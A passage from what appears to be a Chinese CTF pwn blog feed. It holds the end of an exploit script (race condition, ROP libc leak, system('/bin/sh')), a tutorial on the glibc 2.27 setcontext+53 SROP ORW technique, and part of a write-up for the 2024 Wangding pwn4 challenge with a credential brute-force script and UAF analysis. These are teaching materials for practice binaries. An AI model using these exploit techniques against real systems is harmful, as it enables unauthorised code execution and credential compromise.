class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = process(file)</span><br><span class="line">p2 = process(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启双线程</span></span><br><span class="line">add(p1)</span><br><span class="line">add(p2)</span><br><span class="line"></span><br><span class="line">edit(p1)</span><br><span class="line">edit(p2)</span><br><span class="line">sleep(<span class="number">1.2</span>)</span><br><span class="line">p1.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>) </span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004019b3</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">p2.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">show(p2)</span><br><span class="line">p2.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(p2.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_address: &quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样的步骤</span></span><br><span class="line">add(p2)</span><br><span class="line">edit(p1)</span><br><span class="line">edit(p2)</span><br><span class="line">sleep(<span class="number">1.2</span>)</span><br><span class="line">p1.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>) </span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += flat(pop_rdi_ret , bin_sh ,ret, system)</span><br><span class="line">p2.sendafter(<span class="string">&quot;Now please leave your message :&quot;</span>,payload)</span><br><span class="line">show(p2)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p2.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p2.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241106215502390.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc2.27_setcontext+orw</title>
      <link href="/2024/11/04/Glibc2-27-setcontext-orw/"/>
      <url>/2024/11/04/Glibc2-27-setcontext-orw/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>参考文章：<a class="link" href="https://blog.wingszeng.top/pwn-glibc-setcontext/">https://blog.wingszeng.top/pwn-glibc-setcontext/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>在glibc2.27及之下，遇到堆题目开启了沙箱，通常是使用<code>setcontext+53 srop orw</code>去达到获得flag，下面便介绍一下这个方法。</p><h2 id="setcontext的实现"><a href="#setcontext的实现" class="headerlink" title="setcontext的实现"></a><code>setcontext</code>的实现</h2><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241104185642687.bmp"></p><p>可以发现，从<code>setcontext+53</code>开始，我们会通过<code>rdi</code>来给寄存器来赋值，所以也就是说，<mark>只要控制了rdi的值就可以控制所有寄存器的值<mark></mark></mark></p><h2 id="srop的利用"><a href="#srop的利用" class="headerlink" title="srop的利用"></a><code>srop</code>的利用</h2><p>srop其实就是通过<code>sigreturn系统调用</code>来恢复各个寄存器的值,其中是依据<code>signal Frame</code>中储存的数值来进行回复的，但是系统并不会去检查找个是否改动，因此我们可以修改这里面的内容，从而使得控制任意寄存器。</p><h2 id="setcontext-53-srop"><a href="#setcontext-53-srop" class="headerlink" title="setcontext+53 + srop"></a>setcontext+53 + srop</h2><p>这两者的结合可以使得我们控制所有寄存器的数值，即使在不进行<code>sigreturn</code>也可以达到相同的效果</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = ...</span><br><span class="line">frame.rdi = ...</span><br><span class="line">frame.rsi = ...</span><br><span class="line">frame.rdx = ...</span><br><span class="line">frame.rip = ...</span><br><span class="line"></span><br><span class="line">setcontext = setcontext + <span class="number">53</span></span><br><span class="line">setcontext(<span class="built_in">bytes</span>(frame)) -&gt; 相当于srop</span><br></pre></td></tr></table></figure></div><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2024网鼎-青龙组-pwn4"><a href="#2024网鼎-青龙组-pwn4" class="headerlink" title="2024网鼎 青龙组 pwn4"></a>2024网鼎 青龙组 pwn4</h2><p>通过百度网盘分享的文件：pwn<br>链接：<a class="link" href="https://pan.baidu.com/s/1nSRorvpFdPa9CtCQ7JqoOw?pwd=itt3">https://pan.baidu.com/s/1nSRorvpFdPa9CtCQ7JqoOw?pwd=itt3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>提取码：itt3 </p><ul><li>开启沙箱，禁用execve,直接打setcontext+53 orw</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> 0001: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> 0003: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto 0005</span><br><span class="line"> 0004: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto 0008</span><br><span class="line"> 0005: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto 0008</span><br><span class="line"> 0006: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) goto 0008</span><br><span class="line"> 0007: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> 0008: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></div><p>查看ida，发现在正式利用前，还需要输入正确的<code>账号密码</code></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    fread(ptr, <span class="number">1uLL</span>, <span class="number">0x10</span>uLL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( streama )</span><br><span class="line">    &#123;</span><br><span class="line">      fread(v11, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, streama);</span><br><span class="line">      fclose(streama);</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Hello, Welcome to the Security Database. Login first!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Input your username:&quot;</span>);</span><br><span class="line">            <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">            sub_EE7(<span class="number">0</span>, (__int64)s, <span class="number">0x10</span>uLL);</span><br><span class="line">            <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_12EB(s, (__int64)ptr) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid username!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">          <span class="keyword">if</span> ( v4 == <span class="built_in">strlen</span>(ptr) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid username length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Username correct!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Input your password:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x21</span>uLL);</span><br><span class="line">        sub_EE7(<span class="number">0</span>, (__int64)v10, <span class="number">0x20</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_12EB(v10, (__int64)v11) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid password!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">          <span class="keyword">if</span> ( v5 == <span class="built_in">strlen</span>(v11) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Password correct!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Welcome admin!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              sub_1284();</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">              <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_E96() )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">                  sub_134B();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">                  sub_1489();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">                  sub_15D0();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">                  sub_168D();</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">                  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid password length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Can&#x27;t open password file!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Can&#x27;t open username file!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>但是在检验账号密码是否正确的函数中存在漏洞</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12EB</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1); <span class="comment">/* a1是我们自己输入的，这里取得是我们输入的去</span></span><br><span class="line"><span class="comment">  逐字节比较，那么我们可以逐字节去爆破出账号密码*/</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != *(_BYTE *)(i + a2) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="爆破账号密码"><a href="#爆破账号密码" class="headerlink" title="爆破账号密码"></a>爆破账号密码</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">chars = string.printable</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_name</span>():</span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            ru(<span class="string">&quot;Input your username:\n&quot;</span>)</span><br><span class="line">            sl(name+c)</span><br><span class="line">            rev = rl()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Invalid username!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;Invalid username length!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                name += c</span><br><span class="line">                success(name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;Username correct!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                name += c</span><br><span class="line">                success(name)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Congratuation!!&quot;</span>)</span><br><span class="line">                pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_passwd</span>():</span><br><span class="line">    passwd=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            sla(<span class="string">&quot;Input your username:\n&quot;</span>,<span class="string">b&quot;4dm1n&quot;</span>)</span><br><span class="line">            ru(<span class="string">&quot;Input your password:\n&quot;</span>)</span><br><span class="line">            sl(passwd+c)</span><br><span class="line">            rev = rl()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Invalid password!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;password length!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                passwd += c</span><br><span class="line">                success(passwd)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">b&quot;Password correct!&quot;</span> <span class="keyword">in</span> rev:</span><br><span class="line">                passwd += c</span><br><span class="line">                success(passwd)</span><br><span class="line">                pause()</span><br><span class="line"></span><br><span class="line">brute_name()</span><br><span class="line"></span><br><span class="line">brute_passwd()</span><br></pre></td></tr></table></figure></div><h3 id="正式的堆利用"><a href="#正式的堆利用" class="headerlink" title="正式的堆利用"></a>正式的堆利用</h3><ul><li>add</li><li><mark>有限制输入的size，但是足够泄露libc了，输入的内容进过RC4加密之后才放入堆块<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_134B()</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  unsigned <span class="built_in">int</span> v2; // [rsp+0h] [rbp-10h]</span><br><span class="line">  unsigned <span class="built_in">int</span> v3; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *v4; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;Input the value size: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0x300</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Size too big!&quot;</span>);</span><br><span class="line">  v4 = malloc(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;Input the value: &quot;</span>);</span><br><span class="line">  sub_EE7(<span class="number">0</span>, (__int64)v4, v3);</span><br><span class="line">  puts(<span class="string">&quot;Encrypt and save value...&quot;</span>);</span><br><span class="line">  v1 = strlen(aS4cur1tyP4ssw0);                 // RC4</span><br><span class="line">  sub_F98(&amp;unk_203180, aS4cur1tyP4ssw0, v1);</span><br><span class="line">  sub_1152(&amp;unk_203180, v4, v3);</span><br><span class="line">  *((_DWORD *)&amp;unk_203080 + <span class="number">4</span> * v2) = v3;</span><br><span class="line">  qword_203088[<span class="number">2</span> * v2] = v4;</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>show</li><li><mark>输出的也是经过RC4加密的<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_1489</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v3 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Decrypt and read value...&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">  sub_F98((__int64)&amp;unk_203180, (__int64)aS4cur1tyP4ssw0, v1);</span><br><span class="line">  sub_1152(&amp;unk_203180, qword_203088[<span class="number">2</span> * v3], *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_203080 + <span class="number">4</span> * v3));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The result is:\n\t[key,value] = [%d,%s]\n&quot;</span>, v3, (<span class="type">const</span> <span class="type">char</span> *)qword_203088[<span class="number">2</span> * v3]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Encrypt and save value...&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">  sub_F98((__int64)&amp;unk_203180, (__int64)aS4cur1tyP4ssw0, v2);</span><br><span class="line">  sub_1152(&amp;unk_203180, qword_203088[<span class="number">2</span> * v3], *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_203080 + <span class="number">4</span> * v3));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>delete</li><li><mark>很明显的uaf漏洞<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_15D0()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; // rax</span><br><span class="line">  unsigned <span class="built_in">int</span> v2; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *ptr; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  puts(<span class="string">&quot;Input the key: &quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Invalid key!&quot;</span>);</span><br><span class="line">  ptr = (void *)qword_203088[<span class="number">2</span> * v2];</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = strlen(aS4cur1tyP4ssw0);</span><br><span class="line">    sub_F98((__int64)&amp;unk_203180, (__int64)aS4cur1tyP4ssw0, v1);</span><br><span class="line">    sub_1152(&amp;unk_203180, ptr, *((unsigned <span class="built_in">int</span> *)&amp;unk_203080 + <span class="number">4</span> * v2));</span><br><span class="line">    free(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>edit</li><li><mark>输入的也要RC4加密<mark></mark></mark></li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 